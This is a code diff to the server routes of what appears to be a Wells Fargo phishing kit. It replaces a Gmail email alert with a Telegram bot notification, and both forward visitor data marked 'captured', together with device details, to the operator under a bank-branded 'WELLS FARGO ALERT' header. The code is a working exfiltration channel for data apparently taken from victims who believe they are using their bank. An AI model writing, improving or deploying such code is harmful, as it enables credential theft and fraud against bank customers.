@@ -7,59 +7,49 @@ import pgSession from "connect-pg-simple";
 import pg from "pg";
 import * as cheerio from "cheerio";
 import { UAParser } from "ua-parser-js";
-import nodemailer from "nodemailer";
-
-// Email transporter for sending notifications
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_APP_PASSWORD,
-  },
-});
-
-async function sendEmailNotification(subject: string, data: Record<string, any>) {
-  const adminEmail = process.env.ADMIN_EMAIL;
-  if (!adminEmail || !process.env.EMAIL_USER || !process.env.EMAIL_APP_PASSWORD) {
-    console.log("Email notification skipped - credentials not configured");
+// Telegram notification function
+async function sendTelegramNotification(subject: string, data: Record<string, any>) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (!botToken || !chatId) {
+    console.log("Telegram notification skipped - credentials not configured");
     return;
   }
 
-  const htmlContent = `
-    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-      <div style="background: #d71e28; padding: 20px; text-align: center;">
-        <h1 style="color: white; margin: 0; font-family: Georgia, serif;">WELLS FARGO</h1>
-      </div>
-      <div style="background: #ffcd41; height: 6px;"></div>
-      <div style="padding: 20px; background: #f5f5f5;">
-        <h2 style="color: #333;">${subject}</h2>
-        <table style="width: 100%; border-collapse: collapse;">
-          ${Object.entries(data)
-            .filter(([_, value]) => value !== null && value !== undefined && value !== '')
-            .map(([key, value]) => `
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #ddd; font-weight: bold; width: 40%;">${key}</td>
-                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${typeof value === 'object' ? JSON.stringify(value) : value}</td>
-              </tr>
-            `).join('')}
-        </table>
-        <p style="color: #666; font-size: 12px; margin-top: 20px;">
-          Captured at: ${new Date().toLocaleString()}
-        </p>
-      </div>
-    </div>
-  `;
+  // Build message text
+  let message = `🏦 *WELLS FARGO ALERT*\n`;
+  message += `━━━━━━━━━━━━━━━━━━━━\n`;
+  message += `📋 *${subject}*\n\n`;
+  
+  Object.entries(data)
+    .filter(([_, value]) => value !== null && value !== undefined && value !== '')
+    .forEach(([key, value]) => {
+      const displayValue = typeof value === 'object' ? JSON.stringify(value) : value;
+      message += `*${key}:* ${displayValue}\n`;
+    });
+  
+  message += `\n⏰ ${new Date().toLocaleString()}`;
 
   try {
-    await transporter.sendMail({
-      from: process.env.EMAIL_USER,
-      to: adminEmail,
-      subject: `[WF Alert] ${subject}`,
-      html: htmlContent,
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown',
+      }),
     });
-    console.log("Email notification sent successfully");
+    
+    if (response.ok) {
+      console.log("Telegram notification sent successfully");
+    } else {
+      const errorData = await response.json();
+      console.error("Telegram API error:", errorData);
+    }
   } catch (error) {
-    console.error("Failed to send email notification:", error);
+    console.error("Failed to send Telegram notification:", error);
   }
 }
 
@@ -770,7 +760,7 @@ export async function registerRoutes(
         // Additional device info
         emailData["Device"] = `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`;
         
-        sendEmailNotification(`New ${action.replace("_", " ")} captured`, emailData);
+        sendTelegramNotification(`New ${action.replace("_", " ")} captured`, emailData);
       }
     } catch (error) {
       console.error("Failed to log visitor:", error);
